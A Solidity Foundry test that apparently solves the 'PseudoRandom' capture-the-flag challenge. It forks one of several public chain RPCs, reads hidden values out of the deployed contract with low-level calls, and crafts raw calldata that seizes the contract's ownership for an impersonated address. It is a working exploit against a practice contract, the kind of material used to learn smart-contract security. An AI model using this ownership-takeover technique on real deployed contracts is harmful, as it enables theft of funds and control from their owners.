// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PseudoRandom/PseudoRandom.sol";

contract PseudoRandomTest is Test {
    string private BSC_RPC = "https://rpc.ankr.com/bsc"; // 56
    string private POLY_RPC = "https://rpc.ankr.com/polygon"; // 137
    string private FANTOM_RPC = "https://rpc.ankr.com/fantom"; // 250
    string private ARB_RPC = "https://rpc.ankr.com/arbitrum"; // 42161
    string private OPT_RPC = "https://rpc.ankr.com/optimism"; // 10
    string private GNOSIS_RPC = "https://rpc.ankr.com/gnosis"; // 100

    address private addr;

    function setUp() external {
        vm.createSelectFork(BSC_RPC);
    }

    function test() external {
        string memory rpc = new string(32);
        assembly {
            // network selection
            let _rpc := sload(
                add(mod(xor(number(), timestamp()), 0x06), BSC_RPC.slot)
            )
            mstore(rpc, shr(0x01, and(_rpc, 0xff)))
            mstore(add(rpc, 0x20), and(_rpc, not(0xff)))
        }

        addr = makeAddr(rpc);

        vm.createSelectFork(rpc);

        vm.startPrank(addr, addr);
        address instance = address(new PseudoRandom());

        // the solution
        uint256 location;

        assembly {
            location := add(chainid(), sload(addr.slot))
        }

        // get the correct sig stored in the contract 
        (, bytes memory data) = instance.call(abi.encodePacked(hex"3bc5de30", location));
        (, data) = instance.call(abi.encodePacked(hex"3bc5de30", data));
        
        // the data is a 32 bytes hex string with the correct sig in first 4 bytes
        // then we add arbitrary 16(= 4 + 12) bytes in front of the target addr
        (, data) = instance.call(abi.encodePacked(data, hex"12341234123412341234123412341234", addr));

        assertEq(PseudoRandom(instance).owner(), addr);
    }
}